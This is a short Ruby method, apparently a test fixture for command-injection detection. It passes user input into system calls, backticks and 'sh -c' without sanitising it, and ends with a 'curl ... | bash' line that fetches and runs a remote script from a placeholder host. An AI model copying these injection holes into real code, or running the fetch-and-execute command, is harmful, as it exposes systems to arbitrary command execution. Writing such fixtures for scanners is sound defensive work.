def build(name)
  system("echo hi #{name}")
  `echo hi #{params[:name]}`
  system "sh", "-c", "echo " + name
  exec("curl -fsSL https://example.invalid/x | bash")
end
